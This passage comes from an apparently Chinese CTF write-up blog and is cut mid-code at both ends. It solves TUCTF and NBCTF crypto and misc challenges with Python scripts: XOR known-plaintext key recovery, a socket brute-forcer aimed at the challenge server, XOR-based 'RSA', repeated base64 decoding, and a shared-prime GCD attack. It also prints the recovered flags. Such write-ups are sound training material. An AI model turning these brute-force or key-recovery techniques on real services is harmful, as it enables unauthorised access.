class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;table_encryption.xml.enc&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()  <span class="comment">#以ascii码读取</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#因为是xml后缀 也就证明 我们是知道这个加密文件中的部分明文 根据部分已知明文恢复密钥</span></span><br><span class="line">pp = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pp))<span class="comment">#38</span></span><br><span class="line">pm = <span class="string">&#x27;79 52 17 07 05 00 3B 0A 00 1A 07 08 4E 6E 56 50&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pm))<span class="comment">#32  前面的位数不是必须要确定的 而是因为我们推测这个加密的体系 是将文件的内容与给出的密码进行异或</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pm)):</span><br><span class="line">    key += <span class="built_in">chr</span>(<span class="built_in">ord</span>(pp[i])^<span class="built_in">int</span>(pm[i],<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="comment">#到此我们拿到key = Emoji Moring Sta</span></span><br><span class="line"><span class="comment">#所以将目前加密的文件全部逐个十六进制与Emoji Moring Sta 进行异或 即可实现解密</span></span><br><span class="line"></span><br><span class="line">x = <span class="built_in">open</span>(<span class="string">&#x27;flag.xml&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f)):</span><br><span class="line">    x.write(<span class="built_in">chr</span>(f[i]^<span class="built_in">ord</span>(key[i%<span class="built_in">len</span>(key)])))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拿到解密后的文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">&quot;users&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">type</span>=<span class="string">&quot;varchar&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;varchar&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">type</span>=<span class="string">&quot;varchar&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">&quot;posts&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;user_id&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span> <span class="attr">type</span>=<span class="string">&quot;varchar&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span> <span class="attr">type</span>=<span class="string">&quot;varchar&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">&quot;comments&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;post_id&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;user_id&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span> <span class="attr">type</span>=<span class="string">&quot;varchar&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>1<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>John Doe<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">email</span>&gt;</span>john@tuctf.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">password</span>&gt;</span>TUCTF&#123;x0r_t4bl3s_R_fun!!!11!&#125;<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="bludgeon-the-booty-solved">Bludgeon the Booty | SOLVED</h2><h3 id="题面：">题面：</h3><p>You have found me treasure chest, but can you crack its code?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  ___________</span><br><span class="line"> /           \</span><br><span class="line">/__|0|0|0|0|__\</span><br><span class="line">|      @      |</span><br><span class="line">|_____________|</span><br></pre></td></tr></table></figure><p>“This here lock be cursed by the shaman of the swamp to change keys for each attempt”   <code>nc chal.tuctf.com 30002</code></p><h3 id="考点：连接服务器暴力破解">考点：连接服务器暴力破解</h3><h3 id="解题：">解题：</h3><p>3位密码锁 从000到999全部尝试一遍暴力破解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():  </span><br><span class="line">    <span class="comment"># 创建socket对象  </span></span><br><span class="line">    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 连接到服务器  想当于使用了nc指令</span></span><br><span class="line">    server_address = (<span class="string">&#x27;chal.tuctf.com&#x27;</span>, <span class="number">30002</span>)  <span class="comment"># 服务器IP地址和端口号  </span></span><br><span class="line">    client_socket.connect(server_address)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="comment"># 发送选择旋转锁的命令  </span></span><br><span class="line">        client_socket.sendall(<span class="string">b&#x27;1\n&#x27;</span>)  </span><br><span class="line">        <span class="comment"># time.sleep(2)  # 等待服务器响应  </span></span><br><span class="line">        response = client_socket.recv(<span class="number">1024</span>)  <span class="comment"># 接收的最大字节数  </span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;服务器响应: &quot;</span>, response.decode())  </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 发送选择旋转轮子的命令  </span></span><br><span class="line">        client_socket.sendall(<span class="string">b&#x27;1\n&#x27;</span>)  </span><br><span class="line">        <span class="comment"># time.sleep(2)  # 等待服务器响应  </span></span><br><span class="line">        response = client_socket.recv(<span class="number">1024</span>)  <span class="comment"># 接收的最大字节数  </span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;The chest is still locked!&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.decode():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;服务器响应: &quot;</span>, response.decode())  </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 发送选择旋转方向的命令  </span></span><br><span class="line">        client_socket.sendall(<span class="string">b&#x27;+\n&#x27;</span>)  <span class="comment"># 假设选择顺时针方向  </span></span><br><span class="line">        <span class="comment"># time.sleep(2)  # 等待服务器响应  </span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;The chest is still locked!&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.decode():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;服务器响应: &quot;</span>, response.decode())   </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="comment"># 发送选择旋转锁的命令  </span></span><br><span class="line">            client_socket.sendall(<span class="string">b&#x27;1\n&#x27;</span>)  </span><br><span class="line">            <span class="comment"># time.sleep(2)  # 等待服务器响应  </span></span><br><span class="line">            response = client_socket.recv(<span class="number">1024</span>)  <span class="comment"># 接收的最大字节数  </span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;服务器响应: &quot;</span>, response.decode())  </span><br><span class="line">    </span><br><span class="line">            <span class="comment"># 发送选择旋转轮子的命令  </span></span><br><span class="line">            client_socket.sendall(<span class="string">b&#x27;2\n&#x27;</span>)  </span><br><span class="line">            <span class="comment"># time.sleep(2)  # 等待服务器响应  </span></span><br><span class="line">            response = client_socket.recv(<span class="number">1024</span>)  <span class="comment"># 接收的最大字节数  </span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;服务器响应: &quot;</span>, response.decode())  </span><br><span class="line">            <span class="comment"># 发送选择旋转方向的命令  </span></span><br><span class="line">            client_socket.sendall(<span class="string">b&#x27;+\n&#x27;</span>)  <span class="comment"># 假设选择顺时针方向  </span></span><br><span class="line">            <span class="comment"># time.sleep(2)  # 等待服务器响应  </span></span><br><span class="line">            response = client_socket.recv(<span class="number">1024</span>)  <span class="comment"># 接收的最大字节数  </span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;服务器响应: &quot;</span>, response.decode()) </span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">                <span class="comment"># 发送选择旋转锁的命令  </span></span><br><span class="line">                client_socket.sendall(<span class="string">b&#x27;1\n&#x27;</span>)  </span><br><span class="line">                <span class="comment"># time.sleep(2)  # 等待服务器响应  </span></span><br><span class="line">                response = client_socket.recv(<span class="number">1024</span>)  <span class="comment"># 接收的最大字节数  </span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;服务器响应: &quot;</span>, response.decode())  </span><br><span class="line">        </span><br><span class="line">                <span class="comment"># 发送选择旋转轮子的命令  </span></span><br><span class="line">                client_socket.sendall(<span class="string">b&#x27;3\n&#x27;</span>)  </span><br><span class="line">                <span class="comment"># time.sleep(2)  # 等待服务器响应  </span></span><br><span class="line">                response = client_socket.recv(<span class="number">1024</span>)  <span class="comment"># 接收的最大字节数  </span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;服务器响应: &quot;</span>, response.decode())  </span><br><span class="line">                <span class="comment"># 发送选择旋转方向的命令  </span></span><br><span class="line">                client_socket.sendall(<span class="string">b&#x27;+\n&#x27;</span>)  <span class="comment"># 假设选择顺时针方向  </span></span><br><span class="line">                <span class="comment"># time.sleep(2)  # 等待服务器响应  </span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;The chest is still locked!&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.decode():</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;服务器响应: &quot;</span>, response.decode())  </span><br><span class="line">    <span class="comment"># 关闭连接  </span></span><br><span class="line">    client_socket.close()  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>该脚本从000进行遍历，可能耗时会长一点，但是只要抛出结果，脚本就会自动结束</p><h1 id="nbctf">NBCTF</h1><p>网址：<a href="https://nbctf.com/challs">https://nbctf.com/challs</a></p><h2 id="crypto-rivest-shamir-forgot-adleman-solved">crypto/Rivest Shamir forgot Adleman | SOLVED</h2><h3 id="题面：">题面：</h3><p>Exponents took too long. I decided to use an alternative. It won’t about the same right? <a href="https://en.wikipedia.org/wiki/RSA*(cryptosystem)*">https://en.wikipedia.org/wiki/RSA*(cryptosystem)*</a></p><h3 id="考点：异或">考点：异或</h3><h3 id="题目：">题目：</h3><p><a href="http://chall.py">chall.py</a>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">123589168751396275896312856328164328381265978316578963271231567137825613822284638216416</span></span><br><span class="line">m = bytes_to_long(<span class="string">b&quot;nbctf&#123;[REDACTED]&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ct = (m^e) % n</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e = &quot;</span>, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ct = &quot;</span>, ct)</span><br></pre></td></tr></table></figure><p>out.txt:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n =  13431294979312769345517878088407659222785929563176888493659632690735510803353339825485161776891929296355466082338185199541755546384591261208929371208286410559187299345800125302598147388467283782373829399059130130575707550536466670447022349923395822077916588516101640779751198703879200863153859677174339078186779847910915309774616338231020176817201080756103027200290903849975398368943087868140010448011002364291104062990443568049879169811274854879262048473842331319786127894828031613201122015559660817797429013884663990368453887433480357502012963127000535358820517096295714967262963843868885674823702064175405493435873</span><br><span class="line">e =  123589168751396275896312856328164328381265978316578963271231567137825613822284638216416</span><br><span class="line">ct =  159269674251793083518243077048685663852794473778188330996147339166703385101217832722333</span><br></pre></td></tr></table></figure><h3 id="解题：">解题：</h3><p>在模n域中进行异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = getPrime(1024)</span></span><br><span class="line"><span class="comment"># q = getPrime(1024)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># n = p*q</span></span><br><span class="line">e = <span class="number">123589168751396275896312856328164328381265978316578963271231567137825613822284638216416</span></span><br><span class="line"><span class="comment"># m = bytes_to_long(b&quot;nbctf&#123;[REDACTED]&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ct = (m^e) % n</span></span><br><span class="line">n =  <span class="number">13431294979312769345517878088407659222785929563176888493659632690735510803353339825485161776891929296355466082338185199541755546384591261208929371208286410559187299345800125302598147388467283782373829399059130130575707550536466670447022349923395822077916588516101640779751198703879200863153859677174339078186779847910915309774616338231020176817201080756103027200290903849975398368943087868140010448011002364291104062990443568049879169811274854879262048473842331319786127894828031613201122015559660817797429013884663990368453887433480357502012963127000535358820517096295714967262963843868885674823702064175405493435873</span></span><br><span class="line">e =  <span class="number">123589168751396275896312856328164328381265978316578963271231567137825613822284638216416</span></span><br><span class="line">ct =  <span class="number">159269674251793083518243077048685663852794473778188330996147339166703385101217832722333</span></span><br><span class="line">re = (ct^e) % n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(re))</span><br></pre></td></tr></table></figure><h2 id="crypto-32-32-64-solved">crypto/32+32=64 | SOLVED</h2><h3 id="题面：">题面：</h3><p>64 is too much, but 32 isn’t. 32+32=64?</p><h3 id="考点：base64">考点：base64</h3><h3 id="题目：">题目：</h3><p>32_1.txt</p><p>32_2.txt</p><p>两个文件都达到了一万多行 就不贴了</p><h3 id="解题：">解题：</h3><p>这么多数据 就是因为不断使用了base64进行循环加密，所以不断进行base64解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;32_1.txt&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    flag = base64.b64decode(flag)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;nbctf&#123;h0pE_&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;32_2.txt&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    flag = base64.b64decode(flag)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;y0U_h4d_fUn&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="crypto-sbg-abw-s-insanity-solved">crypto/SBG-ABW’s Insanity | SOLVED</h2><h3 id="题面：">题面：</h3><p>“Skill Issue” - AnonymousBlueWhale</p><h3 id="题目：">题目：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long, isPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;we give you this as a gift!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1096</span>)</span><br><span class="line">q1 = getPrime(<span class="number">1096</span>)</span><br><span class="line">q2 = getPrime(<span class="number">1096</span>)</span><br><span class="line">n1 = p*q1</span><br><span class="line">n2 = p*q2</span><br><span class="line"></span><br><span class="line">e = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">ct1 = <span class="built_in">pow</span>(m,e,n1)</span><br><span class="line">ct2 = <span class="built_in">pow</span>(m,e,n2)</span><br><span class="line"></span><br><span class="line">key = hashlib.sha256(long_to_bytes(q1)).digest()</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">enc_flag = cipher.encrypt(pad(<span class="string">b&quot;nbctf&#123;[REDACTED]&#125;&quot;</span>, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ct1 =&quot;</span>, ct1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ct2 =&quot;</span>, ct2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;enc_flag =&quot;</span>, enc_flag.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><h3 id="考点：gcd-整数分解-aes-ecb">考点：gcd 整数分解 AES ECB</h3><h3 id="解题：">解题：</h3><p>对题目进行分析，因为AES.ECB是直接根据密钥进行逆向解密的</p><p>所以我们的目的就是获得q1</p><p>所以观察q1的生成方式，看看在哪里出现了q1，准确定位到对应代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">n1 = p*q1</span><br><span class="line">n2 = p*q2</span><br><span class="line"></span><br><span class="line">e = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">ct1 = <span class="built_in">pow</span>(m,e,n1)</span><br><span class="line">ct2 = <span class="built_in">pow</span>(m,e,n2)</span><br></pre></td></tr></table></figure><p>其中ct1和ct2、m、e均已知，下面进行数学推导</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ct1 = m^e + k1 * n1 = m^e + k1 * p * q1</span><br><span class="line">ct2 = m^e + k2 * n2 = m^e + k2 * p * q2</span><br><span class="line">=&gt;</span><br><span class="line">k1 * p * q1 = ct1 - m^e</span><br><span class="line">k2 * p * q2 = ct2 - m^e</span><br><span class="line">=&gt; 然后我们发现对上面式子中求出来的两个数求gcd公约数即可获得p</span><br><span class="line">=&gt; 然后有p了之后对1式两边同时除p </span><br><span class="line">k1 * q1 = (ct1 - m^e) / p</span><br><span class="line">=&gt;最后一步是要获得q1 显然是有k1的干扰两个数相乘，所以借助一点工具 对这个数进行分解</span><br></pre></td></tr></table></figure><p>法1：本地跑yafu</p><p>法2：在线网站分解https://www.alpertron.com.ar/ECM.HTM</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long, isPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;we give you this as a gift!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = getPrime(1096)</span></span><br><span class="line"><span class="comment"># q1 = getPrime(1096)</span></span><br><span class="line"><span class="comment"># q2 = getPrime(1096)</span></span><br><span class="line"><span class="comment"># n1 = p*q1</span></span><br><span class="line"><span class="comment"># n2 = p*q2</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">11</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ct1 = pow(m,e,n1)</span></span><br><span class="line"><span class="comment"># ct2 = 